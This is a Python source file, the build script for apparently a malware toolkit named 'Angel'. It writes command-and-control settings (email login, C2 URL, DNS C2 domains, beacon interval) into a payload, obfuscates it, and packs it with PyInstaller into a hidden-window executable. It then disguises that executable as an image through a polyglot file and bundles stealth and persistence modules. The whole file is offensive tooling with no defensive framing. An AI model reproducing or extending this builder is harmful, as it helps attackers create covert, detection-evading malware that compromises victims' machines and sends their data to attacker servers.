import os
import sys
import json
import shutil
import argparse
import tempfile
import subprocess
from pathlib import Path
from core.crypter import Crypter
from core.obfuscator import CodeObfuscator
from modules.polyglot import PolyglotBuilder

class AngelBuilder:
    def __init__(self):
        self.crypter = Crypter()
        self.obfuscator = CodeObfuscator()
        self.polyglot = PolyglotBuilder()
        self.build_dir = Path(tempfile.mkdtemp())
        
    def create_config(self, args):
        """Create configuration file"""
        config = {
            'email': args.email,
            'password': args.password,
            'c2_url': args.c2_url,
            'beacon_interval': args.beacon_interval,
            'c2_domains': args.c2_domains.split(',') if args.c2_domains else []
        }
        
        # Remove None values
        return {k: v for k, v in config.items() if v is not None}
        
    def prepare_build_directory(self):
        """Prepare build directory with required files"""
        # Create directories
        (self.build_dir / 'core').mkdir(exist_ok=True)
        (self.build_dir / 'modules').mkdir(exist_ok=True)
        
        # Copy core files
        core_files = ['crypter.py', 'obfuscator.py', 'stealth.py']
        for file in core_files:
            shutil.copy2(f'core/{file}', self.build_dir / 'core' / file)
            
        # Copy module files
        module_files = ['polyglot.py', 'persistence.py', 'communication.py']
        for file in module_files:
            shutil.copy2(f'modules/{file}', self.build_dir / 'modules' / file)
            
        # Copy main file
        shutil.copy2('main.py', self.build_dir / 'main.py')
        
    def build_payload(self, config):
        """Build the final payload"""
        # Read main script
        with open(self.build_dir / 'main.py', 'r') as f:
            main_code = f.read()
            
        # Inject configuration
        config_code = f'''
if __name__ == "__main__":
    config = {json.dumps(config, indent=4)}
    angel = Angel(config)
    angel.run()
'''
        main_code = main_code.replace('if __name__ == "__main__":\n    main()', config_code)
        
        # Obfuscate the code
        obfuscated_code = self.obfuscator.obfuscate_code(main_code)
        
        # Write obfuscated code
        with open(self.build_dir / 'payload.py', 'w') as f:
            f.write(obfuscated_code)
            
        return self.build_dir / 'payload.py'
        
    def create_executable(self, payload_path, output_path):
        """Create executable from Python script"""
        try:
            # Install PyInstaller if not present
            subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyinstaller'], 
                         check=True, capture_output=True)
            
            # Build executable
            subprocess.run([
                'pyinstaller',
                '--onefile',
                '--noconsole',
                '--hidden-import=dns',
                '--hidden-import=dns.resolver',
                '--hidden-import=psutil',
                '--hidden-import=Crypto',
                '--hidden-import=Crypto.Cipher',
                '--hidden-import=Crypto.Cipher.AES',
                '--hidden-import=Crypto.Random',
                '--hidden-import=Crypto.Util.Padding',
                f'--distpath={os.path.dirname(output_path)}',
                '--clean',
                '--name', os.path.basename(output_path).replace('.exe', ''),
                payload_path
            ], check=True, capture_output=True)
            
            return True
        except subprocess.CalledProcessError as e:
            print(f"Error creating executable: {e}")
            return False
            
    def create_polyglot(self, executable_path, carrier_path, output_path):
        """Create polyglot file combining executable with carrier"""
        try:
            # Read executable
            with open(executable_path, 'rb') as f:
                executable_data = f.read()
                
            # Create polyglot
            polyglot_data = self.polyglot.create_polyglot(
                executable_data.decode('latin1'),  # Use latin1 to handle binary data
                carrier_path
            )
            
            # Write output
            with open(output_path, 'wb') as f:
                f.write(polyglot_data)
                
            return True
        except Exception as e:
            print(f"Error creating polyglot: {e}")
            return False
            
    def cleanup(self):
        """Clean up temporary files"""
        try:
            shutil.rmtree(self.build_dir)
        except:
            pass
            
def main():
    parser = argparse.ArgumentParser(description='Build Angel payload')
    
    # Configuration options
    parser.add_argument('--email', help='Email for C2 communication')
    parser.add_argument('--password', help='Email password or app password')
    parser.add_argument('--c2-url', help='URL for C2 server')
    parser.add_argument('--c2-domains', help='Comma-separated list of C2 domains for DNS communication')
    parser.add_argument('--beacon-interval', type=int, default=300,
                      help='Beacon interval in seconds (default: 300)')
    
    # Build options
    parser.add_argument('--carrier', required=True,
                      help='Carrier file (image) to use for polyglot')
    parser.add_argument('--output', required=True,
                      help='Output file path')
    parser.add_argument('--temp-dir', help='Temporary directory for build files')
    
    args = parser.parse_args()
    
    # Create builder
    builder = AngelBuilder()
    
    try:
        print("[*] Starting build process...")
        
        # Create configuration
        config = builder.create_config(args)
        print("[+] Configuration created")
        
        # Prepare build directory
        builder.prepare_build_directory()
        print("[+] Build directory prepared")
        
        # Build payload
        payload_path = builder.build_payload(config)
        print("[+] Payload built")
        
        # Create temporary executable path
        temp_exe = os.path.join(tempfile.gettempdir(), 'temp_angel.exe')
        
        # Create executable
        if builder.create_executable(payload_path, temp_exe):
            print("[+] Executable created")
            
            # Create polyglot
            if builder.create_polyglot(temp_exe, args.carrier, args.output):
                print(f"[+] Polyglot file created: {args.output}")
            else:
                print("[-] Failed to create polyglot file")
        else:
            print("[-] Failed to create executable")
            
    except Exception as e:
        print(f"[-] Build failed: {e}")
        
    finally:
        # Cleanup
        builder.cleanup()
        if os.path.exists(temp_exe):
            os.remove(temp_exe)
            
if __name__ == "__main__":
    main()
